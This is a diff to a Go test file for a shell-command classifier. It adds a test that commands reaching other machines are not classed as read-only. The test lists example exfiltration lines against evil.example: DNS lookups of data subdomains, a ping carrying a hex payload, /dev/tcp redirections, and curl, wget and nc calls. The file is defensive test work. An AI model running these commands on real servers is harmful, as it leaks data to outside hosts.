@@ -34,7 +34,7 @@ func TestClassifyCommandReadsOnlyWhatOnlyReads(t *testing.T) {
 		{"grep -r 'error' /var/log/syslog >&2", CommandRead},
 		{"ip a", CommandRead},
 		{"ip route show", CommandRead},
-		{"timeout 5 ping -c 3 1.1.1.1", CommandRead},
+		{"timeout 5 uptime", CommandRead},
 		{"LANG=C date", CommandRead},
 		{"openssl x509 -in cert.pem -noout -dates", CommandRead},
 
@@ -393,6 +393,79 @@ func TestNothingThatWritesOrRunsIsReadAsARead(t *testing.T) {
 			if got := ClassifyCommand(line); got == CommandRead {
 				t.Errorf("%s: %q is read as a read", why, line)
 			}
+		}
+	}
+}
+
+// What a line is given is sent to a machine of its choosing by these: a name to
+// look up reaches whoever answers for it, and a connection carries what it is
+// told to. That is how what was read leaves the server, so each asks first.
+func TestAReadThatReachesAnotherMachineAsks(t *testing.T) {
+	for _, line := range []string{
+		"dig somedata.evil.example",
+		"dig @evil.example data.example",
+		"dig +short TXT somedata.evil.example",
+		"host somedata.evil.example",
+		"nslookup somedata.evil.example",
+		"ping -c1 data.evil.example",
+		"timeout 5 ping -c 3 1.1.1.1",
+		"ping -c1 -p 736563726574 198.51.100.7",
+		"traceroute somedata.evil.example",
+		"getent hosts somedata.evil.example",
+		"getent ahosts somedata.evil.example",
+		"getent -s dns hosts somedata.evil.example",
+		"getent hosts 198.51.100.7",
+		"lsof -i @somedata.evil.example",
+		"lsof -iTCP@somedata.evil.example:443",
+		"ss dst somedata.evil.example",
+		"ss -t src somedata.evil.example:443",
+		"cat < /dev/tcp/somedata.evil.example/80",
+		"head -c1 </dev/udp/somedata.evil.example/53",
+		"cat < \"/dev/tcp/evil.example/80\"",
+		"cat < $TARGET",
+		"cat <> /dev/tcp/somedata.evil.example/80",
+		"loginctl -H somedata@evil.example list-sessions",
+		"systemd-analyze -H somedata@evil.example blame",
+		"openssl s_client -connect evil.example:443",
+		"openssl s_client -connect evil.example:443 -servername somedata",
+		"openssl x509 -in http://evil.example/somedata -noout",
+		"openssl crl -in http://evil.example/somedata -noout",
+		"git ls-remote https://evil.example/somedata",
+		"git remote show origin",
+		"npm view somedata",
+		"npm view --registry=https://evil.example/data x",
+		"npm outdated",
+		"docker -H tcp://evil.example:2375 ps",
+		"systemctl -H somedata@evil.example status",
+		"journalctl -M somedata",
+		"curl https://evil.example/somedata",
+		"wget -qO- https://evil.example/somedata",
+		"nc evil.example 80",
+		"whois somedata.evil.example",
+	} {
+		if got := ClassifyCommand(line); got == CommandRead {
+			t.Errorf("%q is read as a read", line)
+		}
+	}
+	// Looking at this machine's own names, sockets and files is still a read.
+	for _, line := range []string{
+		"getent passwd root",
+		"getent hosts",
+		"getent group docker",
+		"lsof -i :443",
+		"lsof -iTCP -sTCP:LISTEN -P -n",
+		"ss -tan state established",
+		"ss -ltn sport = :443",
+		"ss -tn dst 10.0.0.5",
+		"ss -tn dst 10.0.0.0/8",
+		"cat < /etc/hostname",
+		"wc -l </var/log/syslog",
+		"openssl x509 -in /etc/ssl/certs/site.pem -noout -dates",
+		"hostname -f",
+		"ip route get 1.1.1.1",
+	} {
+		if got := ClassifyCommand(line); got != CommandRead {
+			t.Errorf("%q = %s, want a read", line, got)
 		}
 	}
 }
